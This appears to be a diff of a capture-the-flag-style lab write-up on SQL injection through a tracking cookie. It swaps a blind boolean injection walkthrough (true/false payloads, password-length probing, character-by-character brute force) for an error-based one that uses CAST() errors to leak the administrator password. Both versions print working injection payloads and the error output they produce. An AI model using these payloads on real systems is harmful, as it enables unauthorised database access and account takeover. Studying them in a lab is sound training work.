@@ -8,39 +8,43 @@ Difficulty: PRACTITIONER
 ![Lab description](img/description.png)
 
 ## Exploitation
-I was told that the tracking cookie value would be used for an SQL query, so I used this as my injection point. I assumed that the SQL query looked something like:
+I started by injection a single quotation mark to see what kind of error I'd be given. I was shown the following:
 
 ``` sql
-SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abc'
+Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'ysTgHuxpzYrfgxH6''. Expected  char
 ```
 
-where `TrackingId=abc` was the cookie value. First, I tested a query that should return True, and thus should cause the page to display "Welcome back". When I added the payload `' AND '1'='1` to the end of the cookie value, the query became:
+This message gave me the entire SQL query being used. I injected `'--` to get rid of the error.
 
-``` sql
-SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'abc' AND '1'='1'
-```
+I wanted to try out the `CAST()` function as this could give me valuable data, so I tried:
 
-and the page showed:
+`TrackingId=ysTgHuxpzYrfgxH6' AND CAST((SELECT username FROM users) as INT)--`
 
-![Welcome back message](img/welcome.png)
+I was met with the error message:
 
-This made sense because `'1'='1'` evaluates to True. I tried again with `'1'='2'` and the "Welcome back" message disappeared, which checked out. Next, I validated the existence of the `users` table and the `administrator` username with the following payloads:
+`Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'ysTgHuxpzYrfgxH6' AND CAST((SELECT username FROM users) as I'. Expected  char`
 
-`' AND (SELECT 'a' FROM users LIMIT 1) = 'a`
+This showed me that my injection was being cut short, potentially due to a character limit. I erased the `TrackingId` value to free up some space and tried again. This time I received:
 
-`' AND (SELECT 'a' FROM users WHERE username = 'administrator') = 'a`
+`ERROR: argument of AND must be type boolean, not type integer`
 
-If the table and username existed, `'a'` would be selected, and `'a'='a'` would evaluate to True. Expectedly, the website showed the "Welcome back" message for both payloads. Next, I needed to figure out how long the password was. I sent the following payload with varying length values until I determined that the password was 20 characters long:
+I added `1=` before my `CAST()` statement to make it a boolean, and I sent it through again, receiving:
 
-`' AND (SELECT 'a' FROM users WHERE username = 'administrator' AND length(password) > 10) = 'a`
+`ERROR: more than one row returned by a subquery used as an expression`
 
-I knew this because the screen showed the "Welcome back" message for `> 19`, meaning it evaluated to True, but disappeared for `> 20`.
+This error was expected. I added `LIMIT 1` to my `SELECT` statement and tried it again.
 
-Finally, I worked on figuring out the password character by character. For the first character, I used the payload:
+`ERROR: invalid input syntax for type integer: "administrator"`
 
-`' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
+This error gave me crucial information; `administrator` is the first row of the table. Knowing this, I sent a query to expose the password:
 
-This would evaluate to True if the first character of the password was 'a'. I had to perform this check for 20 characters, testing all possible values (letters a-z and numbers 1-9), which would prove to be tedious. Thus, I utilized Burp Intruder to automate the process. It tried all possible characters for each character index, marking which ones caused the "Welcome back" message to appear, signifying a correct character placement. It eventually led me to the password `6y8nv5cgoye3ysge1r1k`, which I used to log in to the administrator account.
+`TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) as INT)--`
+
+And it leaked the password:
+
+`ERROR: invalid input syntax for type integer: "sps781mu0d0h6nlc7od9"`
+
+I could then log in to the `administrator` account.
 
 ![Login as administrator](img/login.png)
 
